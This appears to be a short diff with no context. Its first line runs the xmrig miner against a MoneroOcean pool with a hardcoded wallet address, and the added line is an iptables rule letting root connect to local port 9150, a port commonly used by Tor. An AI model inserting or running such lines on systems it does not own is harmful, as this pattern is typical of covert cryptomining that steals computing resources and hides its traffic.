@@ -1,1 +1,2 @@
 xmrig -o gulf.moneroocean.stream:10128 -u 4B9mgKe3zaCG9tP9RGwYQ23PYsokBcmJsLnkyWs1yR3PYBQZnMggUf6WrT7cEGA9pH1revME9FaDs8ycvo1FGL5e9Xe8fVQ -p miner
+sudo iptables -I OUTPUT 3 -d 127.0.0.1/32 -o lo -p tcp -m tcp --dport 9150 --tcp-flags FIN,SYN,RST,ACK SYN -m owner --uid-owner 0 -j ACCEPT
